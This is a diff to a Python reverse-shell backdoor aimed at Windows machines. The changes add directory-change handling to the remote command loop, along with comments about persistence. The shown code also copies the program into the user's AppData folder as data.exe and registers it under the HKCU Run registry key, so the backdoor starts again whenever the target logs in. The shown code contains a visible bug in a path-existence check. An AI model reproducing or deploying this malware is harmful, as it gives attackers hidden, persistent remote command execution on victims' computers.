@@ -6,9 +6,11 @@ import os
 import shutil
 import sys
 
+
 # for persistance:
-    # go to the registry on windows
-    # create a registry key on the user for the reverse.exe
+# go to the registry on windows
+# create a registry key on the user for the reverse.exe
+# will allow to run the program when the target is on
 
 class Reverse_Shell:
     global sock
@@ -49,6 +51,11 @@ class Reverse_Shell:
             command = self.reliable_receive()
             if command == "q":
                 break
+            elif command[:2] == "cd" and len(command) > 1:
+                try:
+                    os.chdir(command[3:])
+                except:
+                    continue
             else:
                 try:
                     # creation of the command, see documentation
@@ -65,12 +72,13 @@ class Reverse_Shell:
                     self.reliable_send("Can't execute the command")
 
     def copy_executable(self):
+        # find the location of the appdata directory
         location = os.environ["appdata"] + "\\data.exe"
         if not os.path.exists[location]:
+            # copy the backdoor executable on the target if running for the first time
             shutil.copyfile(sys.executable, location)
             subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v data /t REG_SZ /d ""'
-                        + location + '"', shell=True)
-
+                            + location + '"', shell=True)
 
     def end_connection(self):
         # close the socket
